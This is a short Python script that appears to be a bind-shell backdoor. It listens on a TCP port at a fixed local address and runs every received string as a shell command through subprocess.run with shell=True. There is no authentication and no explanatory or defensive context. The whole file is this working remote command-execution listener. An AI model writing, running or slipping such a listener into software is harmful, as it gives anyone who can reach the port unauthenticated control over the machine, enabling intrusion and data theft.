# -*- coding: UTF-8 -*-

import socket,subprocess   

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)    

s.bind(("192.168.0.4",9527))

s.listen(5) 

while True:
    client,clientip = s.accept()    
    cmd = client.recv(1024)    
    Res = subprocess.run(cmd.decode("utf8"), shell=True)
    client.close()
s.close()

